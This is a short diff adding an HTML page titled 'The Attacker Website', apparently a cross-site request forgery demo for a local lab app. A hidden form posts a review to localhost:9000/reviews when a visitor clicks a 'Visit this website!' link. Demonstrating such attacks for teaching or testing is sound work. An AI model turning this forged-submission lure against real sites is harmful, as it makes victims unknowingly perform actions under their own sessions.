@@ -1,0 +1,18 @@
+<html lang=en>
+  <head>
+    <meta charset=utf-8>
+    <title>The Attacker Website</title>
+    <link rel="stylesheet" type="text/css" href="css/tacit-css.min.css"/>
+  </head>
+  <body>
+    <h1>The Attacker Website</h1>
+
+    <section>
+      <form method="post" action="http://localhost:9000/reviews">
+          <input type="hidden" name="newReview" value="Attacker's comment">
+      </form>
+      <a href="#" onclick="document.forms[0].submit()">Visit this website!</a>
+    </section>
+    
+  </body>
+</html>
